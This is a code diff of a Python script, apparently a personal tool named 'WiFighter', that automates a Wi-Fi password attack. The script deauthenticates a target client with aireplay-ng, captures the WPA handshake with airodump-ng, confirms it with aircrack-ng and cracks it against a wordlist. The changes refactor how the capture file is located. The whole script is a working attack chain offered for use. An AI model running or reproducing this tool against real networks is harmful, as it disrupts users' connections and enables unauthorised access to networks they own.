@@ -1,8 +1,8 @@
 #!venv/bin/python
 
 import os, sys, subprocess, time
-#import threading
 import multiprocessing
+import re
 
 interface = "wlp1s0mon"
 
@@ -14,14 +14,24 @@ client_mac = "9a:23:6b:36:1f:1b"
 deauth_type = "client"
 
 output_dir = f"/home/filip/Coding/WiFighter/attacks/{ssid}"
-output_file = f"{output_dir}/handshake"
-#output_file = f"/home/filip/Coding/WiFighter/attacks/{ssid}/handshake"
+
+
+def list_files(directory): 
+    return set(os.listdir(directory))
+
+def cap_file(files_before, files_after):
+    new_files = files_after - files_before
+
+    for filename in new_files:
+        if '.cap' in filename:
+            return filename  
+
 
 # Run airodump-ng
-def run_airodump(interface, bssid, channel, output_file):
-    if interface and bssid and channel and output_file:
-        #os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface} > /dev/null 2>&1")
-        command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', output_file, interface]
+def run_airodump(interface, bssid, channel, output_dir):
+    if interface and bssid and channel and output_dir:
+        #os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_dir} {interface} > /dev/null 2>&1")
+        command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
         subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # Run aireplay-ng
@@ -33,11 +43,16 @@ def run_aireplay(interface, bssid, client_mac, deauth_type):
                 command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
                 subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         elif deauth_type == "broadcast":
-            os.popen(f"sudo aireplay-ng -0 1 -a {bssid} {interface}")
+            #os.popen(f"sudo aireplay-ng -0 1 -a {bssid} {interface}")
+            command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
+            subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 # Define processes
-capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_file))
+capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
 deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_type))
+
+files_before = list_files(output_dir) # Get files before airodump-ng adds new
 
 # Listen for handshake
 capture_handshake.start() # Start airodump-ng process
@@ -48,13 +63,18 @@ deauth_client.start() # Start aireplay-ng process
 deauth_client.join() # Wait for the process to stop
 print(f"[1] Deauth packet send to client {client_mac}")
 
+files_after = list_files(output_dir) # Get files after airodump-ng adds new
+
+output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores
+print(output_file)
+
 # Wait and verify that handshake was captured successfuly
 captured = False
 print('[2] Waiting for handshake...')
 while not captured:
-    if os.path.exists(f"{output_file}-01.cap"):
+    if os.path.exists(f"{output_dir}/{output_file}"):
         #verify = os.popen(f"sudo aircrack-ng {output_file}-01.cap").read()
-        command = ['sudo', 'aircrack-ng', f'{output_file}-01.cap']
+        command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
         verify = subprocess.Popen(command, stdout=subprocess.PIPE, text=True)
         output = str(verify.communicate())
         if "(0 handshake)" not in output and "Unknown" not in output:
@@ -65,7 +85,7 @@ while not captured:
 capture_handshake.kill() # Stop airodump-ng process
 capture_handshake.join() # Wait for the process to stop
 
-os.system(f"sudo aircrack-ng -w wordlist.txt {output_file}-01.cap") # Crack password
+os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crack password
 
 
 
